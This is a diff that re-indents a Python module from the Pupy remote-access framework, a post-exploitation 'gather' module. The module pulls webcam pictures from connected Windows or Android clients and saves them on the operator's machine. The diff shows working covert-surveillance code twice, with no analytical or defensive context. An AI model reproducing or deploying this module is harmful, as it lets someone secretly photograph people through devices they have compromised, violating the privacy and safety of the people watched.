@@ -28,42 +28,42 @@ import subprocess
 __class_name__="WebcamSnapModule"
 
 def pil_save(filename, pixels, width, height):
-	from PIL import Image, ImageFile
-	buffer_len = (width * 3 + 3) & -4
-	img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
-	ImageFile.MAXBLOCK = width * height
-	img=img.transpose(Image.FLIP_TOP_BOTTOM)
-	img.save(filename, quality=95, optimize=True, progressive=True)
-	logging.info('webcam snap saved to %s'%filename)
+    from PIL import Image, ImageFile
+    buffer_len = (width * 3 + 3) & -4
+    img = Image.frombuffer('RGB', (width, height), pixels, 'raw', 'BGR', buffer_len, 1)
+    ImageFile.MAXBLOCK = width * height
+    img=img.transpose(Image.FLIP_TOP_BOTTOM)
+    img.save(filename, quality=95, optimize=True, progressive=True)
+    logging.info('webcam snap saved to %s'%filename)
 
 @config(cat="gather", compat=["windows", "android"])
 class WebcamSnapModule(PupyModule):
-	""" take a webcam snap :) """
+    """ take a webcam snap :) """
 
-	def init_argparse(self):
-		self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
-		self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default : 0)')
-		self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')
+    def init_argparse(self):
+        self.arg_parser = PupyArgumentParser(prog='webcam_snap', description=self.__doc__)
+        self.arg_parser.add_argument('-d', '--device', type=int, default=0, help='take a webcam snap on a specific device (default : 0)')
+        self.arg_parser.add_argument('-v', '--view', action='store_true', help='directly open eog on the snap for preview')
 
-	def run(self, args):
-		try:
-			os.makedirs(os.path.join("data","webcam_snaps"))
-		except Exception:
-			pass
-		filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
-		if self.client.is_windows():
-			self.client.load_package("vidcap")
-			dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
-			self.info("device %s exists, taking a snap ..."%args.device)
-			buff, width, height = dev.getbuffer()
-			pil_save(filepath, buff, width, height)
-		elif self.client.is_android():
-			self.client.load_package("pupydroid.camera")
-			data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device)
-			with open(filepath,"w") as f:
-				f.write(data)
-		if args.view:
-			subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
-		self.success("webcam picture saved to %s"%filepath)
+    def run(self, args):
+        try:
+            os.makedirs(os.path.join("data","webcam_snaps"))
+        except Exception:
+            pass
+        filepath=os.path.join("data","webcam_snaps","snap_"+self.client.short_name()+"_"+str(datetime.datetime.now()).replace(" ","_").replace(":","-")+".jpg")
+        if self.client.is_windows():
+            self.client.load_package("vidcap")
+            dev=self.client.conn.modules['vidcap'].new_Dev(args.device,0)
+            self.info("device %s exists, taking a snap ..."%args.device)
+            buff, width, height = dev.getbuffer()
+            pil_save(filepath, buff, width, height)
+        elif self.client.is_android():
+            self.client.load_package("pupydroid.camera")
+            data=self.client.conn.modules['pupydroid.camera'].take_picture(args.device)
+            with open(filepath,"w") as f:
+                f.write(data)
+        if args.view:
+            subprocess.Popen([self.client.pupsrv.config.get("default_viewers", "image_viewer"),filepath])
+        self.success("webcam picture saved to %s"%filepath)
 
 
